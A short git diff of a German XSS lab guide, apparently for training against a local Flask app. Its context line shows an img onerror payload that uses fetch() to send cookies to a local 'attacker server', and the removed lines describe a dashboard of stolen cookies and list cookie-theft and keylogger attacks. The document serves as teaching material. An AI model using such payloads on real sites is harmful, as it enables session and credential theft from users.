@@ -389,32 +389,4 @@ http://localhost:5000/?search=<img src=x onerror="fetch('http://localhost:3000/s
 4. Cookies werden an Attacker Server gesendet
 5. Im Attacker Terminal erscheinen die gestohlenen Cookies
 
-**WICHTIG für Burp Suite:**
-- Mit dem Flask Server siehst du den XSS-Payload **DIREKT in der HTTP Response**
-- Dies ist **echtes Reflected XSS** (server-seitig)
-- Die alte Version mit SimpleHTTPServer war DOM-based XSS (client-seitig)
 
-**Im Dashboard siehst du:**
-- Alle gestohlenen Cookies
-- Zeitstempel
-- IP-Adresse
-- User-Agent
-- Weitere Daten je nach Payload
-
----
-
-# Zusammenfassung
-
-## Angriffe OHNE Server:
-- Einfache Alert-Boxen
-- Cookie-Anzeige im Browser
-- Phishing-Formulare (Daten im Alert)
-- Keylogger (Console/Alert)
-
-## Angriffe MIT Server:
-- Cookie-Diebstahl mit Übertragung
-- Keylogger mit Datenübertragung
-- Kombinations-Angriffe
-- Vollständige Datenerfassung
-
-**Server-Vorteil:** Persistente Speicherung und Echtzeit-Monitoring aller gestohlenen Daten im Dashboard.
